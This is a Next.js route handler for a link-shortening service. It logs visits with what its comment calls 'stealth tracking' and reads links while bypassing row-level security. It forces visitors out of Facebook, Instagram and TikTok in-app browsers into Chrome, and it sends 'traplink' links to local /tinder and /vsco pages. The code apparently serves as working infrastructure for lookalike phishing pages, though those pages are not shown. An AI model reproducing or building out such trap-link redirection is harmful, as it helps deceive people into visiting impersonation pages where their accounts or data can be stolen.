import { credentialsConfig } from '@/config/credentials.config';
import { bypassRLS } from '@/lib/db';
import { trackPageView } from '@/lib/tracking';
import { getAppScheme, getCurrentEpoch } from '@/lib/utils';
import { revalidatePath } from 'next/cache';
import { NextRequest, NextResponse } from 'next/server';

export async function GET(
  req: NextRequest,
  { params }: { params: { short: string; lang: string } },
) {
  const shortCode = params.short;
  const lang = params.lang || 'en';
  const userAgent = req.headers.get('user-agent') || '';
  const isMobile = /mobile|android|iphone|ipad|ipod/i.test(
    userAgent.toLowerCase(),
  );
  const isInAppBrowser = /fb|instagram|fbav|line|wv|tiktok/i.test(
    userAgent.toLowerCase(),
  );
  const isAndroid = /android/i.test(userAgent.toLowerCase());
  const isIOS = /iphone|ipad|ipod/i.test(userAgent.toLowerCase());

  // Ambil base URL untuk digunakan pada URL absolut
  const baseUrl = credentialsConfig.siteUrl || new URL(req.url).origin;

  // Menggunakan stealth tracking utility
  await trackPageView({
    pageType: 'link',
    shortCode: shortCode,
  });

  const noRLS = await bypassRLS();
  // Get the link
  const link = await noRLS.links.findUnique({
    where: {
      short_code: shortCode,
    },
    select: {
      id: true,
      short_code: true,
      original_url: true,
      title: true,
      is_active: true,
      expires_at: true,
      created_at: true,
      updated_at: true,
      type: true,
      page_type: true,
    },
  });

  if (
    !link ||
    !link.is_active ||
    (link.expires_at && link.expires_at < getCurrentEpoch())
  ) {
    return NextResponse.redirect(new URL('/404', baseUrl));
  }

  revalidatePath('/dashboard');

  // Jika terdeteksi in-app browser, langsung arahkan ke Chrome mobile
  if (isInAppBrowser && link.original_url) {
    const url = new URL(link.original_url);
    if (isAndroid) {
      // Langsung gunakan intent URL untuk Android Chrome
      return NextResponse.redirect(
        `intent://${url.host}${url.pathname}${url.search}#Intent;scheme=${url.protocol.replace(':', '')};package=com.android.chrome;end`,
        { status: 307 },
      );
    } else if (isIOS) {
      // Langsung gunakan Chrome scheme untuk iOS
      return NextResponse.redirect(
        `googlechrome://${url.host}${url.pathname}${url.search}`,
        { status: 307 },
      );
    }
  }

  // Handle deeplinks for mobile devices
  if (isMobile && link.original_url) {
    const url = new URL(link.original_url);
    // Check if it's a known app URL pattern
    if (url.host.includes('tinder.com')) {
      return NextResponse.redirect(`tinder://`, { status: 307 });
    } else if (url.host.includes('vsco.co')) {
      return NextResponse.redirect(`vsco://`, { status: 307 });
    } else if (url.protocol === 'http:' || url.protocol === 'https:') {
      // For regular web URLs, try to detect app scheme
      const appScheme = getAppScheme(url.host);
      if (appScheme) {
        return NextResponse.redirect(appScheme, { status: 307 });
      }
    }
  }

  // Special handling for trap links
  if (link.type === 'traplink' && link.page_type) {
    if (link.page_type === 'tinder') {
      return NextResponse.redirect(
        new URL(`/${lang}/tinder?shortcode=${shortCode}`, baseUrl),
      );
    } else if (link.page_type === 'vsco') {
      return NextResponse.redirect(
        new URL(`/${lang}/vsco?shortcode=${shortCode}`, baseUrl),
      );
    }
  }

  // Default redirect to original URL
  return NextResponse.redirect(link.original_url);
}
